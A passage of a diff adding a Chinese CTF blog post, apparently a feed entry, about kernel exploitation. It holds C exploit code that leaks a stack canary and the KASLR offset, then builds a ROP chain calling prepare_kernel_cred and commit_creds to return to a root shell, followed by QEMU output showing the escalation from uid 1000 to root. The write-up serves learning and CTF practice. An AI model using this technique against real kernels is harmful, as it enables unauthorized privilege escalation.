+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> offset <span class="token operator">=</span> vmlinux_base <span class="token operator">-</span> raw_vmlinux_base<span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} canary: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} leak offset: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">char</span> rop_buf<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>rop_buf<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//rbx</span>
+    <span class="token comment" spellcheck="true">//ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81000b2f</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdi ; ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109cce0</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//prepare_kernel_cred</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810a0f49</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdx ; ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109c8e0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//commit_creds</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8101aa6a</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov rdi, rax ; call rdx</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a012da</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//swapgs ; popfq ; ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81050ac2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//iretq</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>
+
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy from user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop_buf<span class="token punctuation">,</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} lets rop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889a</span><span class="token punctuation">,</span><span class="token number">0xffffffffffff0000</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>use gcc make it </p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gcc -g exp.c -o exp
+</code></pre>
+<p>将编译好的exp放入解包后德tmp目录里 并且重新打包</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">ls</span>
+bin       core.id2  core.til     init   linuxrc  sbin  usr
+core.id0  core.ko   etc          lib    proc     sys   vmlinux
+core.id1  core.nam  gen_cpio.sh  lib64  root     tmp
+➜  core ./gen_cpio.sh core.cpio
+<span class="token keyword">.</span>
+./vmlinux
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+./lib64
+./lib64/libm.so.6
+./lib64/ld-linux-x86-64.so.2
+./lib64/libc.so.6
+./sys
+125600 块
+
+➜  core <span class="token function">mv</span> core.cpio <span class="token punctuation">..</span>/
+</code></pre>
+<p>运行exp 成功提权</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  core <span class="token function">cd</span> <span class="token punctuation">..</span>
+➜  give_to_player ./start.sh 
+qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx <span class="token punctuation">[</span>bit 5<span class="token punctuation">]</span>
+<span class="token punctuation">[</span>    0.026145<span class="token punctuation">]</span> Spectre V2 <span class="token keyword">:</span> Spectre mitigation: LFENCE not serializing, switching to generic retpoline
+udhcpc: started, v1.26.2
+udhcpc: sending discover
+udhcpc: sending <span class="token keyword">select</span> <span class="token keyword">for</span> 10.0.2.15
+udhcpc: lease of 10.0.2.15 obtained, lease <span class="token function">time</span> 86400
+/ $ 
+/$ <span class="token function">id</span>
+uid<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span> gid<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span> groups<span class="token operator">=</span>1000<span class="token punctuation">(</span>chal<span class="token punctuation">)</span>
+/$ <span class="token function">cd</span> tmp
+/$ ./exp
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> fd: 3
+commit_creds addr: 0xffffffff9869c8e0
+vmlinux_base addr: 0xffffffff98600000
+prepare_kernel_cred addr: 0xffffffff9869cce0
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> <span class="token keyword">set</span> off
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> ret: 0
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> copy to user
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> ret: 0
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> canary: 0x3b35ff2e9fa44700
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> leak offset: 0x17600000
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> copy from user
+<span class="token punctuation">{</span><span class="token operator">==</span>dbg<span class="token operator">==</span><span class="token punctuation">}</span> lets rop
+/tmp <span class="token comment" spellcheck="true"># id</span>
+uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+</code></pre>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>还是有很多不懂得地方，边学习边记录 </p>
+]]></content>
     
     <summary type="html">
+    
+      &lt;p&gt;感谢CTF-wiki、P4nda、Veritas501  收获很大&lt;/p&gt;
+&lt;p&gt;首先捋清kernel pwn 与 用户态下的pwn的区别&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;f
     
     </summary>
     
